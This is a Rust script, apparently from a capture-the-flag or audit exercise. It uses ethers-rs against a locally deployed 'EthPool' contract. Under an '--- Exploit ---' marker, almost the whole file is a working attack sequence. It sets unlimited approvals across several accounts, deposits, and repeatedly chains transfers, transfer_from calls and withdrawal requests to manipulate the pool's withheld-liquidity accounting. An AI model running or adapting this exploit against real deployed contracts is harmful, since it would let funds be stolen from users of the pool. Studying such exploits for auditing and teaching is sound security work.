use anyhow::Result;
use std::{fs, sync::Arc, path::Path, convert::TryFrom};

use ethers::{
    prelude::*,
    utils::{format_ether, parse_ether, launch_ganache, Ganache, GanacheInstance},
};
use ethers::prelude::*;

abigen!(
    EthPool,
    "./build/EthPool.abi",
    event_derives(serde::Deserialize, serde::Serialize)
);

#[tokio::main]
async fn main() -> Result<()> {
    #![allow(non_snake_case)]
    let WETH_POOL: Address = "0xD3D13a578a53685B4ac36A1Bab31912D2B2A2F36".parse()?;

    // let node: &GanacheInstance = &launch_ganache(ganache).await;
    // let provider = Provider::<Http>::try_from(node.endpoint())?;
    // let accts: Vec<LocalWallet> = node.keys()[..10]
    //     .iter()
    //     .map(|x| x.clone().into())
    //     .collect();
    // let client = Arc::new(SignerMiddleware::new(provider.clone(), accts[0].clone()));
    // let pool = EthPool::new(WETH_POOL, client);

    let provider = Provider::<Http>::try_from("http:localhost:8545")?;
    let pool = EthPool::new(WETH_POOL, Arc::new(provider.clone()));

    let accts = provider.get_accounts().await?;
    let con0 = accts[0];
    let con1 = accts[1];
    let con2 = accts[2];
    let con3 = accts[3];

    // --- Exploit ---

    let amt = parse_ether(U256::from(10))?;

    // // set approvals
    pool.approve(con0, U256::MAX).from(con1).send().await?.await?;
    pool.approve(con0, U256::MAX).from(con2).send().await?.await?;
    pool.approve(con0, U256::MAX).from(con3).send().await?.await?;

    // // both deposit into the pool
    pool.deposit(amt).from(con0).value(amt).send().await?.await?;
    pool.deposit(amt).from(con1).value(amt).send().await?.await?;

    pool.request_withdrawal(amt).from(con0).send().await?.await?;
    pool.request_withdrawal(amt).from(con1).send().await?.await?;

    let mut wliq = pool.withheld_liquidity().call().await?;
    println!("wliq0: {}", format_ether(wliq));

    pool.transfer_from(con1, con0, amt).from(con0).send().await?.await?;

    pool.transfer(con2, amt).from(con0).send().await?.await?;
    pool.request_withdrawal(amt).from(con0).send().await?.await?;
    pool.request_withdrawal(amt).from(con2).send().await?.await?;
    pool.transfer_from(con2, con0, amt).from(con0).send().await?.await?;

    pool.transfer(con3, amt).from(con0).send().await?.await?;
    pool.request_withdrawal(amt).from(con0).send().await?.await?;
    pool.request_withdrawal(amt).from(con3).send().await?.await?;
    pool.transfer_from(con3, con0, amt).from(con0).send().await?.await?;

    pool.request_withdrawal(amt.checked_mul(2.into()).unwrap()).from(con0).send().await?.await?;

    wliq = pool.withheld_liquidity().call().await?;
    println!("wliq2: {}", format_ether(wliq));

    let req_con1 = pool.requested_withdrawals(con1).call().await?;
    println!("req_con1: {:?}", req_con1);

    Ok(())
}
